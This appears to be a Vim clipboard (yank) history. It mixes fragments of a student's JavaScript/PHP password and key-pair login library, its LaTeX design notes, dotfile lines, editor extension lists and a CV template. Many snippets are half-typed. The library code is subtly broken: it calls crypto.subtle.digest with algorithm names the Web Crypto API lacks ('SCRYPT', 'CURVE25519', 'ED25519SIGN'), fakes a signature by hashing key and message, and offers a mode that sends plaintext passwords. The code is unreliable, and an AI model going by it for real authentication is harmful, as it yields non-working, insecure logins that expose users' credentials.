	        // let username = document.getElementById("username").value;
	        // let method = document.getElementById("method").value;
	        authenticate(username, password, method, "http://localhost:80/index.php", "af82");
8e395b7a23c532a634c484941883726e|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|8|5|V|javascript
	        // let password = document.getElementById("passwd").value;
	        // let username = document.getElementById("username").value;
	        // let method = document.getElementById("method").value;
99e3f872760281a65b4a8c65b2883b28|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|59|23|v|php
	Login error
89249b489aa6d95bb0aa6c9c6eba69f3|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|52|1|V|php
	            $toCheck = array_key_exists("$username", $password_array) ? $password_array["$username"] : NULL;
36d98d89c9ff09789e6b2e36e9603050|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|74|13|V|php
	            $toCheck = $public_key_array["$username"];
23751e51438a1c9077898564f2a5596b|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|11|1|V|javascript
	    $("#login-form").submit(function() {
	        authenticate(username, password, method, "http://localhost:80/index.php", "af82");
	        return false;
	  });
9d613cf8d065d7429cd82961c185f9e0|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|7|59|V|javascript
	        password = document.getElementById("passwd").value;
	        username = document.getElementById("username").value;
	        method = document.getElementById("method").value;
	    });
b14593258df2b68524e4f5dc4f71f333|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|2|12|V|javascript
	    let password; 
	    let username;
	    let method;
aa9f7cb4ac4b26b8e8d09b305b6794de|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|8|6|V|javascript
	        authenticate(username, password, method, "http://localhost:80/index.php", "af82");
	        return false;
82d791ff513fb226be9ecd8bf8bdc75d|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|4|1|V|javascript
	        let password = document.getElementById("passwd-lgn").value;
	        let username = document.getElementById("username-lgn").value;
	        let method = document.getElementById("method-lgn").value;
7a191115173121331fd45a68ae2fc8d0|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|13|9|V|javascript
	        p=
564213bde4b286d68b0dce392f1ef234|file:///home/neo/Documents/diplomatiki/javascript-files/timings.txt|6|34|v|text
	, 424 ms
0cb280aad1676b6d2c621c67bdfeb4e3|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|74|19|v|php
	toCheck
7f5b9c368c56d22cc65a090a0286d3b1|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|75|13|V|php
	            echo $signa
8a9bbeb2962b42fb3ae7d9eee7a5718c|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|74|13|V|php
	            echo $public_key;
65340ba32ff85cb8a182957c65e5008a|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|68|17|v|php
	$public_key_array["$username"] 
f4483578903da8cef7656bf7ae3c77af|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|69|17|V|php
	                echo "User $username registered!";
6fe40fadf75072a62e76757d460949b0|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|3|6|v|javascript
	scrypt_seed_keypair
a69e8c75134a5a44c1ef57b7b06c627e|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|1|5|v|javascript
	methodObject
4c3880bb027f159e801041b1021e88e8|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|50|20|v|javascript
	Method
50a7924ed84020a913f44d4bed79f80b|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|54|1|V|javascript
	       if(key === "passwordMinLength"){
	            CredentialType.passwordMinLength = credentialTypeInput.passwordMinLength;
	            console.log(credentialTypeInput.passwordMinLength);
	       } else if (key === "passwordProccessMethod"){
	           CredentialType.passwordProccessMethod =  
	       }
10d3c3fe44959e283512ea5beac22ed9|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|61|11|V|javascript
	           CredentialType.passwordProccessMethod =  
37f91a10810c37a0f946c88eecf0bb86|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|59|11|V|javascript
	           
995b98f11ef73bf6ae9cfdf7131e18b5|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|56|16|V|javascript
	               credentialTypeInput.passwordMinLength
90f628062b841a78f2dc16f8b61774f5|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|56|16|v|javascript
	credentialTypeInput.passwordMinLength
e2ebf0369794e68670ccffaa198dc630|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|58|62|V|javascript
	            CredentialType.passwordMinLength = credentialTypeInput.passwordMinLength;
	            console.log(credentialTypeInput.passwordMinLength);
afa32ff392f261a6f7bbd6a58b4fa577|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|56|13|V|javascript
	               
6446f236eca7411d95984628439e521b|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|127|1|V|javascript
	    "passwordMinLength": null,
	    "passwordProccessMethod": "plain",
	};
	
	let supportedMethods = ["plain","scrypt_seed_keypair"];
	
	let hexToBytes = function(hex) {
	    let bytes;
	    for (bytes = [], c = 0; c < hex.length; c += 2)
	        bytes.push(parseInt(hex.substr(c, 2), 16));
	    return bytes;
	}
	
	let createKeyPairFromPassword = async function(password) {
	  const encoder = new TextEncoder();
	
	  //Get scrypt hash of password
	  const passEnc = encoder.encode(password);
	  const hashScrypt = await crypto.subtle.digest("SCRYPT", passEnc);
	  const hashArrayScrypt = Array.from(new Uint8Array(hashScrypt)); // convert buffer to byte array
	
	  //Slice scrypt hash to 32 bytes to get the privateKey
	  const privateKeyArray = hashArrayScrypt.slice(0, 32);
	  const privateKey = privateKeyArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  const privateKeyEnc = hexToBytes(privateKey);
	  const privateKeyBytes = new Uint8Array(privateKeyEnc);
	  //Curve25519 scalar mult lower 32 bytes of sha512 hash to get public key
	  const publicKeyPromise = await crypto.subtle.digest(
	    "CURVE25519",
	    privateKeyBytes
	  );
	  const publicKeyByteArray = Array.from(new Uint8Array(publicKeyPromise)); // convert buffer to byte array
	
	  const publicKey = publicKeyByteArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  return privateKey.concat(publicKey);
	}
	
	let signMessage = async function (keypair, message) {
	  const input = keypair.concat(message);
	  const inputBuf = hexToBytes(input);
	  const inputArray = new Uint8Array(inputBuf);
	  return crypto.subtle.digest("ED25519SIGN", inputArray);
	}
	
	function initializeCredetialType(credentialTypeInput){
	    for (key in credentialTypeInput){
	       if(key === "passwordMinLength"){
	           if (isInteger(credentialTypeInput.passwordMinLength)){
	                CredentialType.passwordMinLength = credentialTypeInput.passwordMinLength;
	                console.log(credentialTypeInput.passwordMinLength);
	           } else{
	                throw ('passwordMinLength must be an integer');
	           }
	       } else if (key === "passwordProccessMethod"){
	           if (supportedMethods.includes(credentialTypeInput.passwordProccessMethod)){
	               CredentialType.passwordProccessMethod =  credentialTypeInput.passwordProccessMethod;
	               console.log("Method: ", CredentialType.passwordProccessMethod);
	           } else{
	                throw ('method not supported');
	           }
	       }
	    }
	
	}
	
	async function signup(username, password, method, server){
	
	    let postData = {};
	    postData.username = username;
	    postData.mode = "register";
	    
	    if (method === "password"){
	        postData.password = password;
	    } else if (method === "keypair"){
	        let keypair = await createKeyPairFromPassword(password);
		    let public_key = keypair.substr(64,128);
	        postData.public_key = public_key;
	    } else {
	        throw("Method not supported");
	    }
	    let postResult = Promise.resolve(
	        $.post(server,
	            postData,
	            function(data){
	                console.log(data);
	            })
	    );    
	    return postResult;
	}
	
	async function authenticate(username, password, method, server, message = ""){
	    
	    let postData = {};
	    postData.username = username;
	    postData.mode = "login";
	
	    if (method === "password"){
	        postData.password = password;
	    } else if (method === "keypair"){
	        let keypair = await createKeyPairFromPassword(password);
	        let public_key = keypair.substr(64,128);
	        let signedMessageBytes = await signMessage(keypair, message);
	        let signedMessageArray = Array.from(new Uint8Array(signedMessageBytes));
	        let signature = signedMessageArray.map(b => b.toString(16).padStart(2, '0')).join('');
	
	        postData.public_key = public_key;
	        postData.signature = signature;
	    } else {
	        throw("Method not supported");
	    }
	
	    let postResult = Promise.resolve(
	        $.post(server,
	            postData,
	            function(data){
	                console.log(data);
	            })
	    );    
	    return postResult;
	}
	
a937b745261c08cf079af8031f33887c|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|115|5|V|javascript
	    } else {
	        throw("Method not supported");
	    }
cdfe0f1a4fea92e85f0a63b25c3209d1|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|97|48|v|javascript
	 method
ea9f6aca279138c58f705c8d4cb4b8ce|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|103|9|v|javascript
	method
271bb53eb3b402ef27d12a664c09b1fd|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|78|54|v|javascript
	ssword
bf767138a79cc63f886a3f05276ddf69|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|78|9|v|javascript
	credentialType
fed1f37d40a3e8a0103bf5e95875a82f|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|72|43|v|javascript
	meth
ee6b41ea715ae314f6acc32befafe28d|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|10|9|V|javascript
	        let method = document.getElementById("method-lgn").value;
b906e189eb391eb54a3e95e7ebf7987e|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|10|42|v|javascript
	method,
fb96cf040a711adb52e7ab09ca19b27e|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|17|9|V|javascript
	        let method = document.getElementById("method-rgst").value;
a882e371b55387e3d1789affb9167091|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|17|36|v|javascript
	method, 
ac7938d40cfc2307e2bf325d28e7884e|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|4|34|v|javascript
	plain
2fce7394fa69f9470d75dabec8ed429c|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|26|1|V|html
	<select id="method-rgst">
	  <option value="password">Register with password</option>
	  <option value="keypair">Register with key pair</option>
	</select>
7f47c274363dad159f6f2e3681e87c36|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|1|1|V|javascript
	let CredentialType = {
	    "passwordMinLength": null,
	    "passwordProccessMethod": "plain",
	};
e4245c7a5c43ace904522575c5a37bb8|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|57|17|V|javascript
	                console.log(credentialTypeInput.passwordMinLength);
1c24aedeeeee75e884908a916f94c0b3|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|63|12|V|javascript
	               console.log("Method: ", CredentialType.passwordProccessMethod);
87122b0ac423d8ecc6c677b94206d75e|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|57|16|V|javascript
	               console.log(CredentialType.)
1a06968be7d77b1f0f9fc99fa0105a54|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|64|1|V|javascript
	           } else{
	               console.log("method err");
	                throw ('method not supported');
	           }
41652207902935399e4c0c23b74741b1|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|66|12|V|javascript
	           console.log("method err");
e31b4e69e069f158679ab9ec43337492|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|58|13|V|javascript
	               console.log("length err");
cb3a4d67c4f997a68df8924b2b18d70d|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|65|26|v|javascript
	not supported
22342d79db914e59e2c111de7e0feb47|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|68|19|v|javascript
	key, ': unknown field'
42bd4c0819c498d1c1ab622de74d6f82|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|65|36|v|javascript
	supported
9ca22724dbfb7df14b3c7176f20f1d41|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|65|24|v|javascript
	'method not'
fa0d3770419b77961a313868a2a1663b|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|5|9|V|javascript
	        wrong: "wrng",
912ec803b2ce49e4a541068d495ab570|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|4|34|v|javascript
	asdf
6605108b07d0e93dbea01cbd3545a00d|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|16|1|V|html
	<select id="method-lgn">
	  <option value="password">Login with password</option>
	  <option value="keypair">Login with key pair</option>
	</select>
e07564eabb74ac9dabfe0ed96e36dcf3|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|115|5|V|javascript
	    console.log(postData);
ab7475cb76a28b70400a5bd3d32a34c3|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|69|17|V|php
	                echo $public_key_array["$username"]; 
a8db5d35a73024ff9d942b67d0df5071|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|140|1|V|javascript
	    "passwordMinLength": null,
	    "passwordProccessMethod": "plain",
	};
	
	let supportedMethods = ["plain","scrypt_seed_ed25519_keypair"];
	
	let hexToBytes = function(hex) {
	    let bytes;
	    for (bytes = [], c = 0; c < hex.length; c += 2)
	        bytes.push(parseInt(hex.substr(c, 2), 16));
	    return bytes;
	}
	
	let createKeyPairFromPassword = async function(password) {
	  const encoder = new TextEncoder();
	
	  //Get scrypt hash of password
	  const passEnc = encoder.encode(password);
	  const hashScrypt = await crypto.subtle.digest("SCRYPT", passEnc);
	  const hashArrayScrypt = Array.from(new Uint8Array(hashScrypt)); // convert buffer to byte array
	
	  //Slice scrypt hash to 32 bytes to get the privateKey
	  const privateKeyArray = hashArrayScrypt.slice(0, 32);
	  const privateKey = privateKeyArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  const privateKeyEnc = hexToBytes(privateKey);
	  const privateKeyBytes = new Uint8Array(privateKeyEnc);
	  //Curve25519 scalar mult lower 32 bytes of sha512 hash to get public key
	  const publicKeyPromise = await crypto.subtle.digest(
	    "CURVE25519",
	    privateKeyBytes
	  );
	  const publicKeyByteArray = Array.from(new Uint8Array(publicKeyPromise)); // convert buffer to byte array
	
	  const publicKey = publicKeyByteArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  return privateKey.concat(publicKey);
	}
	
	let signMessage = async function (keypair, message) {
	  const input = keypair.concat(message);
	  const inputBuf = hexToBytes(input);
	  const inputArray = new Uint8Array(inputBuf);
	  return crypto.subtle.digest("ED25519SIGN", inputArray);
	}
	
	function initializeCredentialType(credentialTypeInput){
	    for (key in credentialTypeInput){
	       if(key === "passwordMinLength"){
	           if (Number.isInteger(credentialTypeInput.passwordMinLength)){
	                CredentialType.passwordMinLength = credentialTypeInput.passwordMinLength;
	           } else{
	                throw ('passwordMinLength must be an integer');
	           }
	       } else if (key === "passwordProccessMethod"){
	           if (supportedMethods.includes(credentialTypeInput.passwordProccessMethod)){
	               CredentialType.passwordProccessMethod = credentialTypeInput.passwordProccessMethod;
	           } else{
	                let errorMessage = credentialTypeInput.passwordProccessMethod + ": method not supported";
	                throw (errorMessage);
	           }
	       } else{
	           let errorMessage = key + ": unknown field";
	           throw (errorMessage);
	       }
	    }
	}
	
	async function signup(username, password, server){
	
	    let postData = {};
	    postData.username = username;
	    postData.mode = "register";
	    
	    if (!(CredentialType.passwordMinLength === null)){
	        if (password.length < CredentialType.passwordMinLength){
	            let errorMessage = "Password must be at least " + CredentialType.passwordMinLength + " characters long";
	            throw (errorMessage);
	        }
	    }
	    if (CredentialType.passwordProccessMethod === "plain"){
	        postData.password = password;
	    } else if (CredentialType.passwordProccessMethod === "scrypt_seed_ed25519_keypair"){
	        let keypair = await createKeyPairFromPassword(password);
		    let public_key = keypair.substr(64,128);
	        postData.public_key = public_key;
	    }
	
	    let postResult = Promise.resolve(
	        $.post(server,
	            postData,
	            function(data){
	                console.log(data);
	            })
	    );    
	    return postResult;
	}
	
	async function authenticate(username, password, server, message = ""){
	    
	    let postData = {};
	    postData.username = username;
	    postData.mode = "login";
	
	    if (CredentialType.passwordProccessMethod === "plain"){
	        postData.password = password;
	    } else if (CredentialType.passwordProccessMethod === "scrypt_seed_ed25519_keypair"){
	        let keypair = await createKeyPairFromPassword(password);
	        let public_key = keypair.substr(64,128);
	        let signedMessageBytes = await signMessage(keypair, message);
	        let signedMessageArray = Array.from(new Uint8Array(signedMessageBytes));
	        let signature = signedMessageArray.map(b => b.toString(16).padStart(2, '0')).join('');
	
	        postData.public_key = public_key;
	        postData.signature = signature;
	    }
	
	    let postResult = Promise.resolve(
	        $.post(server,
	            postData,
	            function(data){
	                console.log(data);
	            })
	    );    
	    return postResult;
	}
	
f2095999830987fe0bcd617299ca92ed|file:///home/neo/.profile|31|1|V|sh
	export PATH="$HOME/.cargo/bin:$PATH"
f91cd5d61e1e331b360fdbfe56588cbf|file:///home/neo/.profile|32|21|v|sh
	cargo
5a90ef193f4d66817f62ef5df460c6c3|file:///home/neo/.vimrc|4|1|V|vim
	filetype plugin indent on
7fb209910d1d12f0d86e768a94b2b793|file:///home/neo/.vim/bundle/vimtex/ftplugin/tex.vim|11|13|v|vim
	ftplugin
2ad8d929904366e0cc0f27c127bee75d|file:///home/neo/.vim/bundle/vimtex/ftplugin/tex.vim|11|9|v|vim
	did_wi
afc77a046e20afd5fbbbaebceceb7af1|file:///home/neo/.vim/bundle/vimtex/ftplugin/tex.vim|11|8|v|vim
	Tets
4ab8774bacb1538200f94cc7cdc6e8b1|file:///home/neo/.vim/bundle/vimtex/ftplugin/tex.vim|11|1|V|vim
	echom b:did_ftplugin
22edb3b5b9023655b13b3e8fac73bd96|list:/extensions|2|1|V|list
	* coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-texlab	1.9.10	~/.config/coc/extensions/node_modules/coc-texlab
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
1443c5abf96b437642b80e5b81f9939d|file:///home/neo/Documents/latex_test/test.tex|3|1|V|tex
	\begin{document}
5e3bedeaeb5deb1039acf2ed98489637|file:///home/neo/Documents/latex_test/test.tex|6|1|V|tex
	\end{document}
0cbc6611f5540bd0809a388dc95a615b|file:///home/neo/Documents/latex_test/test.tex|8|1|V|tex
	Test
b9095a42a531b14d0c87bb86f4cd1c58|file:///home/neo/Documents/latex_test/test.tex|3|1|V|tex
	\beg
8595d101a98c6349893b4610aede4ee1|list:/extensions|15|1|V|list
	* coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
5a1a660ffa5fa19d16b70656afdab2dd|list:/extensions|5|1|V|list
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
1064889a6d67d8ba585835fea43f5ade|list:/extensions|15|1|V|list
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
e1f19dffd2deb7ac3ebb4d0bd67b15bb|list:/extensions|15|1|V|list
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
e815a490700bbc05ba53c229b44cbe35|file:///home/neo/Documents/resume/cv.tex|53|1|V|tex
	\hfill{}Download this document:
	
	\hfill{}\href[gray]{https://LukeSmith.xyz/cv.pdf}{https://LukeSmith.xyz/cv.pdf \pdf}
	
5c1cd9edf00f1998f78db48229a7ece9|file:///home/neo/Documents/resume/cv.tex|1|1|V|tex
	% xelatex
238bd1fca1d561637caa980f9ca4e27f|file:///home/neo/Documents/resume/cv.tex|137|2|V|tex
		\www{} : &\href{https://www.lukesmith.xyz}{https://lukesmith.xyz}
3b0b7ad6c6cae31cab32cd5de612404c|file:///home/neo/Documents/resume/cv.tex|139|1|V|tex
	\begin{minipage}[t]{.5\linewidth}
	\begin{tabular}{rl}
		\gh{} : & \href{http://github.com/LukeSmithxyz}{github.com/LukeSmithxyz}\\
		\yt{} : &\href{http://youtube.com/c/LukeSmithxyz}{youtube.com/c/LukeSmithxyz}
	\end{tabular}
	\end{minipage}
e67518e1767738f270074ce4f57ff86b|file:///home/neo/Documents/resume/cv.tex|18|1|V|tex
	% Macro to allow image links in XeLaTeX
	\ifxetex
	  \usepackage{letltxmacro}
	  \setlength{\XeTeXLinkMargin}{1pt}
	  \LetLtxMacro\SavedIncludeGraphics\includegraphics
	  \def\includegraphics#1#{% #1 catches optional stuff (star/opt. arg.)
	    \IncludeGraphicsAux{#1}%
	  }%
	  \newcommand*{\IncludeGraphicsAux}[2]{%
	    \XeTeXLinkBox{%
	      \SavedIncludeGraphics#1{#2}%
	    }%
	  }%
	\fi
	%%%%%%%
da39fac801b3a1b6101e69dd4cbac662|file:///home/neo/Documents/resume/cv.tex|35|1|V|tex
	{\footnotesize\hfill{}\color{gray}
	\hfill{}(Last updated \thedate.)
	}
0e52dae57cdd0ffb65f0cb5274af6e02|file:///home/neo/Documents/resume/cv.tex|34|1|V|tex
		\begin{minipage}[t]{.25\textwidth}
	{\footnotesize\hfill{}\color{gray}
	\hfill{}(Last updated \thedate.)
	}
		\end{minipage}
79143e7b2fa4ba4973035b97182c20de|file:///home/neo/Documents/resume/cv.tex|132|1|V|tex
	\entry{2013--2015}
		{M.A. in Linguistics}
		{\uga, Athens, Georgia}
		{Major in Syntax; minor in \textbf{Romance Languages}. Thesis: \textit{External Possession and the Undisentanglability of Syntax and Semantics} \href{https://lukesmith.xyz/thesis.pdf}{\pdf}. Advisor: \vera.}
	
	\entry{2012}
		{Exchange Program, Zh√®ngzh≈çu University (\cfont{ÈÉëÂ∑ûÂ§ßÂ≠¶})}
		{Zh√®ngzh≈çu, China}
		{Studying Chinese history.}
	
	\entry{2009--2012}
		{B.A. in International Economics and Modern Languages}
		{Andrew Young School of Policy Studies, \gsu, Atlanta}
		{Specializations in Spanish and Chinese. Certificates in Economic History and International Trade.}
	
e42b5699629389f321fa379462cdb43d|file:///home/neo/Documents/resume/cv.tex|133|1|V|tex
	
	More teaching information, along with my \textbf{teaching evaluations} and some materials can be found on my website at \href{http://www.lukesmith.xyz/classes}{lukesmith.xyz/classes \www}.
	
	%\entry{2017--Now}{``Historical Linguistics''}{YouTube}{An ongoing lecture series on YouTube, originally focusing on Historical Linguistics and Linguistic Thought, but branching out to more general topics.}
	
3b863edcf1f78dbe54bc1652111a7495|file:///home/neo/Documents/resume/cv.tex|9|1|V|tex
	\usepackage{fontspec}
38b6d76587783f2a65b003864d47c52b|file:///home/neo/Documents/resume/cv.tex|116|4|V|tex
	\begin{itemize}
	\item Maintainer and developer of an Arch Linux-based metadistribution at \href{https://larbs.xyz}{https://larbs.xyz \www}.
71f28ae3d6f5c528e5c79d35af4365cd|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|4|1|V|tex
	We crated a
3734fd90fee6f4f8d9b78e138c087ce6|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|4|1|V|tex
	We created a 
d98a07f84921b24ee30f86fd8cd85c3c|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|6|48|v|tex
	from
d9ec98db4f38a3325466cff112cdc7cc|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|6|24|v|tex
	requires minimal effort by the web application programmer
cf1e8c14e54505f60aa10ceb8d5d8ab3|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|8|15|v|tex
	server
1378b8e8c4abb70c128cfc70e33694bb|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|7|1|v|tex
	\begin{enumerate}
e1d19ed6a0204bb02bd81c03177196d0|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|7|1|v|tex
	\end{enumerate}
23a58bf9274bedb19375e527a0744fa9|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|6|475|v|tex
	with
00545df34c8281dd3f681bdf2e656b8e|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|10|1|V|tex
	The web programmer that wishes to use our library for their server will include {\tt auth.js} in their web application's source. The library will be fetched from either the server itself or from a trusted third party, such as a Content Distribution Network. They should also choose the authentication scheme they wish to use and 
d6408f4cb22392ef703a8ced7b422d86|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|10|11|v|tex
	They should also choose the authentication scheme they wish to use and 
f79c61cd315cfd9f3104d8e7022f2863|file:///home/neo/.vimrc|16|6|v|vim
	localleader
e60b391aaf8bf32c7fae741130830b85|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|10|22|v|tex
	nt tries to authenticate with the server, our library will enforce the client's browser to use the chosen authentication scheme.
7ff0fe707ad26506d34b7f35b197fa62|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|12|1|V|tex
	
	
	
	     
72dc17b7d8f687b1ce1cd41dee53f1a4|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|5|1|V|tex
	Our Javascript library provides an easy-to-use API that can be used by the web application programmer with minimal effort. The library will be used as follows: 
8f9d37ae454036953090818d540e8406|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|6|1|V|tex
	\begin{itemize}
	    \item The web programmer that wishes to use our library for their server will include {\tt auth.js} in their web application's source.
	    \item The library will be fetched from either the server itself or from a trusted third party, such as a Content Distribution Network. 
	    \item The web programmer will use one of our API calls in their own Javascript source to enforce the library to use the authentication scheme of their choice.
	    \item When a client tries to authenticate with the server, the client's browser will enforce the usage of the chosen authentication scheme. 
	\end{itemize}
4ab57483724829010c32e288b605d5e5|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|6|277|v|tex
	underlying
f9ddf8d57550d7f8dcf6686a369804b6|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|1|V|tex
	    \item The library will be fetched from either the server itself or from a trusted third party, such as a Content Distribution Network. 
cd3a1470ee93e6ea76ba2efdcedac64b|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|8|5|v|tex
	\item
7487fd2d116473a5200657f36d9b0fe0|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|8|1|v|tex
	     The library will be fe
